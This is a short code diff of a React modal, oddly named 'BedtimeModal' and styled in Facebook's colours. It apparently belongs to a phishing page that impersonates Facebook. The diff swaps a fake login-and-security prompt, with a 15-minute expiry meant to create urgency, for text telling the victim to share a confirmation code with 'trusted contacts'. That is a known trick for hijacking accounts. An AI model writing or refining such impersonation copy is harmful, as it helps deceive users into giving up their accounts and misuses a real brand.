@@ -11,12 +11,9 @@ export default function BedtimeModal({ open, onClose }: BedtimeModalProps) {
   return (
     <Dialog open={open} onOpenChange={onClose}>
       <DialogContent className="max-w-md text-center p-6">
-        <h2 className="text-lg mb-3" style={{ maxWidth: "500px", margin: "0 auto", lineHeight: "1.4" }}>
-          Log in to confirm your identity and secure your Facebook account. Updating your trusted contacts helps keep your account safe and protected.
-        </h2>
-
-        <p className="text-facebook-text-light text-sm mb-6">
-          This page will expire in 15 minutes for security purposes.
+        <h2 className="text-2xl font-bold mb-3 text-facebook-blue">You're almost done</h2>
+        <p className="mb-4" style={{ fontSize: "16px", lineHeight: "1.4" }}>
+          We've sent you a confirmation code. Share this code with one of your trusted contacts to help complete your identity verification.
         </p>
 
         <Button
